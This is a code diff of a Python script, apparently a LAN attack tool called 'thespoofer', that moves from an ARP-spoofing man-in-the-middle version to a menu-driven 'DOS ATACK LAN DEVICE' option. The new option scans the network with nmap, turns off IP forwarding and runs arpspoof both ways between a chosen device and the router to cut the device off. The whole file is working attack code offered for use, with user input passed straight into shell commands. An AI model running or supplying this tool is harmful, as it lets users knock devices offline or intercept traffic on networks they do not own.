@@ -1,9 +1,28 @@
 import os
-import nmap
+import sys
+import time
 
-nm = nmap.PortScanner()
 
-print ("""
+class bcolors:  # TEXT COLORS
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKCYAN = '\033[96m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+
+
+def slowprint(s):  # SLOW TEXT
+    for c in s + '\n':
+        sys.stdout.write(c)
+        sys.stdout.flush()
+        time.sleep(1./1000)
+
+
+slowprint(f""" {bcolors.OKGREEN}
 
 ▄▄▄█████▓ ██░ ██ ▓█████   ██████  ██▓███   ▒█████   ▒█████    █████▒▓█████  ██▀███  
 ▓  ██▒ ▓▒▓██░ ██▒▓█   ▀ ▒██    ▒ ▓██░  ██▒▒██▒  ██▒▒██▒  ██▒▓██   ▒ ▓█   ▀ ▓██ ▒ ██▒
@@ -19,31 +38,62 @@ print ("""
 """)
 
 print('')
-gateway = input ('Gateway Ex. 192.168.1.1/24: ') # GATEWAY
-print ('')
 
-print ("Let's Scan Your Network")
-scan_range = nm.scan(hosts=gateway) # SCAN NETWORK
-print(scan_range['scan'])
-
-device = input ('Device to Attack: ') # DEVICE TO ATTACK
-
-network_interface = input('Network Interface to use: ')
+print(f'{bcolors.ENDC}WHAT DO YOU WANT TO DO? ')  # OPTIONS
+print('')
+print(f'{bcolors.BOLD}1. DOS ATACK LAN DEVICE')
+print('2. ANOTHER ATTACK')
+print('')
+option = input(f'{bcolors.ENDC}YOUR OPTION: {bcolors.OKGREEN}')
+print(f'{bcolors.WARNING}SET ')
 print('')
 
-print("All Ready Let's Start the Atack")
 
-print ('IP Forwarding Activated')
-os.system('echo 1 >> /proc/sys/net_ipv4/ip_forward') # IP FORWARDING
-print ('')
+def dos():
+    gateway = input(
+        f'{bcolors.ENDC}{bcolors.BOLD}YOUR GATEWAY Ex. 192.168.1.1/24: {bcolors.ENDC}{bcolors.OKGREEN}')  # GATEWAY
+    router = gateway[:-3]
+    print(f'{bcolors.WARNING}SET ')
+    print('')
 
-os.system('arpspoof -i ' + network_interface + ' -t ' + device + " " + gateway) # SPOOFING
-print('Atacking Router Completed')
+    # DISCOVERY DEVICES
+    print(f"{bcolors.ENDC}{bcolors.BOLD}LET'S SCAN YOUR NETWORK: {bcolors.ENDC}")
+    os.system('nmap ' + gateway + ' -sP')
+    print('')
 
-os.system('arpspoof -i ' + network_interface + ' -t ' + gateway + " " + device) # SPOOFING
-print('Atacking Device Completed')
-print('')
+    # DEVICE TO ATTACK
+    device = input(
+        f'{bcolors.BOLD}DEVICE TO ATTACK: {bcolors.ENDC}{bcolors.OKGREEN}')
+    print(f'{bcolors.WARNING}SET ')
+    print('')
 
-print('Do you want to Stop Attack? ')
-print('Press Enter')
-os.system('echo 0 >> /proc/sys/net_ipv4/ip_forward') # STOP IP FORWARDING
+    # NETWORK INTERFACES
+    print(f"{bcolors.ENDC}{bcolors.BOLD}LET'S SHOW YOUR NETWORK INTERFACES: {bcolors.ENDC}")
+    os.system('nmcli device status')
+    print('')
+    network_interface = input(
+        f'{bcolors.BOLD}NETWORK INTERFACE TO USE: {bcolors.ENDC}')
+    print(f'{bcolors.WARNING}SET ')
+    print('')
+
+    # STARTING ATTACK
+    print(f"{bcolors.ENDC}{bcolors.BOLD}STARTING DOS DEVICE ATTACK: {bcolors.ENDC}")
+    time.sleep(2.5)
+
+    os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
+    print('')
+
+    spoof_router = ('arpspoof -i ' + network_interface +
+                    ' -t ' + device + ' -r ' + router)
+    os.system(f'gnome-terminal -- bash -c "{spoof_router} && read"')
+
+    spoof_device = ('arpspoof -i ' + network_interface +
+                    ' -t ' + router + ' -r ' + device)
+    os.system(f'gnome-terminal -- bash -c "{spoof_device} && read"')
+
+
+# OPTIONS
+if option == '1':
+    dos()
+else:
+    print(f'{bcolors.WARNING}THIS OPTION IS WORKING... {bcolors.ENDC}')
